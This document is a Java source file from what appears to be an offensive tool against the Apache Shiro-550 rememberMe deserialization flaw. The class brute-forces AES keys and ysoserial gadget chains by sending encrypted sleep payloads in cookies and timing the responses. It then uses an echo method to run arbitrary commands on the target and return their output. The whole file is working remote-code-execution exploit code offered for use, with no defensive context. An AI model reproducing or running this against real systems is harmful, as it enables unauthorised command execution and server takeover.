package com.shiroexploit.vulnverifier;

import com.shiroexploit.core.AesEncrypt;
import com.shiroexploit.util.*;
import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class Shiro550VerifierUsingEcho implements Verifier{
    private Config config;
    private String key;
    private List<PayloadType> gadgets;
    private List<EchoType> echoTypes;

    public Shiro550VerifierUsingEcho(){
        System.out.println("[*] Using Shiro550VerifiertUsingEcho");
        this.config = Config.getInstance();
        this.gadgets = new ArrayList<>();
        this.echoTypes = new ArrayList<>();
    }

    @Override
    public void getValidGadget() throws ExploitFailedException {
        label1:for(PayloadType type : config.getGadgets()){
            System.out.println("[*] Trying Gadget: " + type.getName());

            for(String key : config.getKeys()){
                String  command = "java -jar \"" + System.getProperty("user.dir") + File.separator + "ysoserial.jar\" " + type.getName()
                        + " directive:sleep:10";

                byte[] payload = Tools.exec(command);
                String rememberMe = AesEncrypt.encrypt(key, payload);

                int delay = HttpRequest.getRequestDelay(config.getRequestInfo(),rememberMe);
                if(delay >= 9){
                    int secondTest = delay + 5;
                    command = "java -jar \"" + System.getProperty("user.dir") + File.separator + "ysoserial.jar\" " + type.getName()
                            + " directive:sleep:" + secondTest;

                    payload = Tools.exec(command);
                    rememberMe = AesEncrypt.encrypt(key, payload);
                    System.out.println("[*] directive:sleep:" + secondTest + " Cookie Length: " + rememberMe.length());
                    delay = HttpRequest.getRequestDelay(config.getRequestInfo(),rememberMe);

                    if(delay >= secondTest - 1){
                        System.out.println("[+] Time delay Detected, target seems to be vulnerable, confirming....");
                        this.key = key;
                        this.gadgets.add(type);

                        getValidEchoMethod();

                        if(this.echoTypes.size() > 0){
                            System.out.println("[+] Vuln Confirmed");
                            System.out.println("[+] Find Valid Key: " + this.key);
                            System.out.println("[+] Find Valid Gadget: " + this.gadgets.get(0));
                            for(EchoType echoType : this.echoTypes){
                                System.out.println("[+] Find Valid Echo Method: " + echoType.getName());
                            }
                            break label1;
                        }else{
                            System.out.println("[-] Looks like a false positive or can not find a valid echo method");
                            this.gadgets.clear();
                        }
                    }
                }
            }
        }

        if(this.gadgets.size() == 0){
            throw new ExploitFailedException("[-] Can not find a valid key or find a valid Gadget!");
        }
    }

    private void getValidEchoMethod(){
        this.echoTypes = EchoUtil.getValidEchoType(this.key, this.gadgets.get(0));
    }

    @Override
    public String executeCmd(String cmd) {
        PayloadType payloadType = Tools.randomSelect(gadgets);
        EchoType echoType = Tools.randomSelect(echoTypes);

        System.out.println("");
        System.out.println("[*] Using Key " + this.key);
        System.out.println("[*] Using Gadget " + payloadType.getName());
        System.out.println("[*] Using Echo Method " + echoType.getName());
        System.out.println("[*] Executing command: " + cmd + "...");


        String result = EchoUtil.getEchoResult(key, payloadType, cmd, echoType);
        System.out.println("[+] Done");

        return result;
    }
}
